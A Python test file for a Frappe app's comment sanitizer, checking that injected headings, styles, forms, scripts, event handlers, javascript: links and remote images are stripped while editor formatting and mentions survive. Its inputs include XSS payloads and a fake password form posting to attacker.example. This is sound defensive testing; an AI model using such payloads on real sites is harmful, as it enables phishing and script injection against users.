from types import SimpleNamespace
from unittest import TestCase

import frappe
from frappe.tests.utils import FrappeTestCase

from custom_fsf.overrides.comment import sanitize_comment_content, sanitize_comment_html


class TestCommentSanitizer(TestCase):
    def test_removes_stored_html_injection_elements(self):
        content = """
            <h1 id="page-title">Injected heading</h1>
            <style>body { display: none }</style>
            <form action="https://attacker.example">
                <input name="password">
                <button>Sign in</button>
            </form>
            <dialog open>Fake prompt</dialog>
            <svg><script>alert(1)</script><circle></circle></svg>
            <p>Safe text</p>
        """

        cleaned = sanitize_comment_content(content)

        for unsafe_fragment in (
            "<h1",
            "<style",
            "display: none",
            "<form",
            "<input",
            "<button",
            "<dialog",
            "<svg",
            "<script",
        ):
            self.assertNotIn(unsafe_fragment, cleaned)
        self.assertIn("Injected heading", cleaned)
        self.assertIn("Safe text", cleaned)

    def test_removes_unsafe_attributes_and_remote_images(self):
        content = """
            <div class="modal show" style="position:fixed" onclick="alert(1)">Text</div>
            <a href="javascript:alert(1)" target="_blank">Bad link</a>
            <a href="http://[">Malformed link</a>
            <img src="https://attacker.example/tracker.png" onerror="alert(1)" width="9999">
        """

        cleaned = sanitize_comment_content(content)

        for unsafe_fragment in (
            "modal",
            "style=",
            "onclick=",
            "javascript:",
            'href="http://["',
            "target=",
            "attacker.example",
            "onerror=",
            "width=",
        ):
            self.assertNotIn(unsafe_fragment, cleaned)

    def test_preserves_supported_formatting_images_and_mentions(self):
        content = """
            <div class="ql-editor read-mode">
                <p class="ql-align-right ql-direction-rtl" dir="rtl">
                    <strong>Important</strong> <em>message</em>
                    <a href="https://example.com" title="Example">link</a>
                </p>
                <ol><li data-list="ordered" class="ql-indent-1">Item</li></ol>
                <pre class="ql-syntax">print(&quot;safe&quot;)</pre>
                <img src="/private/files/example.png" alt="Example">
                <span class="mention" data-id="user@example.com" data-value="User"
                    data-denotation-char="@" data-is-group="false">
                    <span class="ql-mention-denotation-char">@</span>User
                </span>
            </div>
        """

        cleaned = sanitize_comment_content(content)

        for safe_fragment in (
            'class="ql-editor read-mode"',
            'class="ql-align-right ql-direction-rtl"',
            'href="https://example.com"',
            'data-list="ordered"',
            'src="/private/files/example.png"',
            'class="mention"',
            'data-id="user@example.com"',
        ):
            self.assertIn(safe_fragment, cleaned)

    def test_hook_only_changes_user_comments(self):
        user_comment = SimpleNamespace(comment_type="Comment", content="<h1>Heading</h1>")
        system_comment = SimpleNamespace(comment_type="Info", content="<h1>Heading</h1>")

        sanitize_comment_html(user_comment)
        sanitize_comment_html(system_comment)

        self.assertEqual(user_comment.content, "Heading")
        self.assertEqual(system_comment.content, "<h1>Heading</h1>")


class TestCommentSanitizerIntegration(FrappeTestCase):
    def test_doc_event_sanitizes_a_new_comment(self):
        todo = frappe.get_doc(
            doctype="ToDo",
            description=f"Comment sanitizer test {frappe.generate_hash(length=8)}",
        ).insert()

        comment = todo.add_comment(
            "Comment",
            """
                <h1>Injected heading</h1>
                <style>body { display: none }</style>
                <form><input name="password"><button>Sign in</button></form>
                <p><strong>Safe comment</strong></p>
            """,
        )

        self.assertNotIn("<h1", comment.content)
        self.assertNotIn("<style", comment.content)
        self.assertNotIn("<form", comment.content)
        self.assertNotIn("<input", comment.content)
        self.assertNotIn("<button", comment.content)
        self.assertIn("Injected heading", comment.content)
        self.assertIn("<strong>Safe comment</strong>", comment.content)
